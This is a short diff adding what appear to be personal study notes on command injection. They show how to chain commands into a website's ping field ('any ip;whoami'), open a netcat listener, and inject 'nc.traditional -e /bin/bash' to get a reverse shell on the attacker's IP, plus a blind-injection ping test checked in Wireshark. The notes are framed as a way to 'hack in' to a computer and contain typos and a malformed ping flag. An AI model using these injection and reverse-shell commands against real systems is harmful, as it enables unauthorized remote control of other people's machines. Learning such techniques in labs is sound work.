@@ -1,0 +1,20 @@
+Injenction attacks require user input.
+
+Command ejection: To check terminals of computer you want to hack in
+
+To do it, from a pinging website run the command:
+any ip;command(ex whoami)
+
+To connect to a computer use the command netcat like:
+nc -lvp "port(12345)"
+
+And from website run:
+any ip;nc.traditional -e /bin/bash "our ip" 12345
+
+Blind injection: Cannot confirm using ping command to know if we connected
+
+To try:
+"any IP"; ping "our IP" c -3
+
+To check it:
+type wireshark in terminal (inspect your packets on a certain network interface)
